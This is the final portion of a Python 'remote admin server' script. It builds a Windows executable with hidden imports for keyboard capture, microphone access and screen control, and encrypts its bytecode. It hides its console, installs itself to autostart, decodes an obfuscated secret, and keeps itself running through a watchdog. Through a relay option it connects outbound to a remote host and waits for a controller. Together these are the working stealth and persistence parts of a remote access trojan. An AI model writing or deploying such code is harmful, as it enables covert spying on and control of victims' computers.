        "--hidden-import=pynput", "--hidden-import=sounddevice",
        "--hidden-import=numpy", "--hidden-import=psutil",
        "--hidden-import=pyautogui",
        "--noupx",
        "--key", hashlib.sha256(SHARED_SECRET.encode() if SHARED_SECRET else b"default").hexdigest()[:16],
        str(script),
    ]
    log.info("Building: %s", " ".join(cmd))
    r = subprocess.run(cmd, cwd=script.parent)
    if r.returncode == 0:
        log.info("EXE: %s", script.parent / "dist" / "remote_server.exe")
    else:
        log.error("Build failed")


# ===================================================================
# Hide console
# ===================================================================
def hide_console():
    if not IS_WINDOWS:
        return
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass


# ===================================================================
# Main
# ===================================================================
SHARED_SECRET = ""

def main():
    global SHARED_SECRET
    parser = argparse.ArgumentParser(description="Remote admin server")
    parser.add_argument("--secret", required=True)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8765)
    parser.add_argument("--build-exe", action="store_true")
    parser.add_argument("--hidden", action="store_true")
    parser.add_argument("--install", action="store_true")
    parser.add_argument("--watchdog", action="store_true", help="Enable auto-restart on crash")
    parser.add_argument("--relay", help="Relay server (host:port) for NAT traversal")
    args = parser.parse_args()

    SHARED_SECRET = args.secret

    if SHARED_SECRET.startswith("OBF:"):
        SHARED_SECRET = _deobfuscate_secret(SHARED_SECRET)

    try:
        apply_pending_updates()
    except Exception as e:
        log.exception("Pending update error: %s", e)

    if args.install:
        install_autostart()
        return
    if args.build_exe:
        build_exe()
        return

    if args.hidden:
        hide_console()

    log_path = setup_file_logging()
    log.info("Server started, log: %s", log_path)

    if not HAS_MSS:
        log.warning("mss missing")
    if not HAS_CV2:
        log.warning("opencv-python missing")

    log.info("Starting on ws://%s:%d", args.host, args.port)

    async def run_server():
        try:
            if args.relay:
                relay_host, relay_port = args.relay.rsplit(":", 1) if ":" in args.relay else (args.relay, "9000")
                relay_uri = f"ws://{relay_host}:{relay_port}"
                room_id = hashlib.sha256(SHARED_SECRET.encode()).hexdigest()[:16]

                async def relay_connect_loop():
                    while True:
                        try:
                            log.info("Connecting to relay %s ...", relay_uri)
                            ws = await websockets.connect(relay_uri, ping_interval=30, ping_timeout=10, max_size=20*1024*1024)
                            auth = {"type": "auth", "room": room_id, "token": SHARED_SECRET, "role": "server"}
                            await ws.send(json.dumps(auth))
                            resp = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))
                            if resp.get("type") != "auth_ok":
                                log.error("Relay auth failed: %s", resp)
                                await asyncio.sleep(5)
                                continue
                            log.info("Relay authenticated, room: %s. Waiting for client...", room_id)
                            await client_handler(ws)
                        except Exception as e:
                            log.error("Relay error: %s. Reconnecting in 5s...", e)
                            await asyncio.sleep(5)

                await relay_connect_loop()
            else:
                ws_kwargs = dict(
                    ping_interval=30,
                    ping_timeout=10,
                    max_size=20 * 1024 * 1024,
                )
                if not IS_WINDOWS:
                    ws_kwargs["reuse_port"] = True
                async with websockets.serve(
                    client_handler,
                    args.host, args.port,
                    **ws_kwargs,
                ):
                    log.info("Server running. Waiting for clients...")
                    await asyncio.Future()
        except asyncio.CancelledError:
            log.info("Server cancelled, exiting cleanly")
        except KeyboardInterrupt:
            log.info("KeyboardInterrupt, exiting cleanly")

    if args.watchdog:
        _run_with_watchdog(args, run_server)
    else:
        try:
            asyncio.run(run_server())
        except KeyboardInterrupt:
            log.info("Server stopped by user")


def _run_with_watchdog(args, run_server_coro):
    max_restarts = 10
    restart_window = 300
    restarts = []

    while True:
        try:
            asyncio.run(run_server_coro())
            log.info("Server exited cleanly")
            break
        except KeyboardInterrupt:
            log.info("Server stopped by user")
            break
        except SystemExit as e:
            if e.code == RESTART_EXIT_CODE:
                log.info("Server restarting after update...")
                continue
            log.info("Server exiting (uninstall or restart)")
            break
        except Exception as e:
            now = time.time()
            restarts = [t for t in restarts if now - t < restart_window]
            restarts.append(now)

            if len(restarts) >= max_restarts:
                log.critical("Too many crashes (%d in %ds). Stopping watchdog.", max_restarts, restart_window)
                break

            wait = min(30, 2 ** len(restarts))
            log.error("Server crashed: %s. Restarting in %ds... (attempt %d/%d)",
                      e, wait, len(restarts), max_restarts)
            time.sleep(wait)


if __name__ == "__main__":
    main()
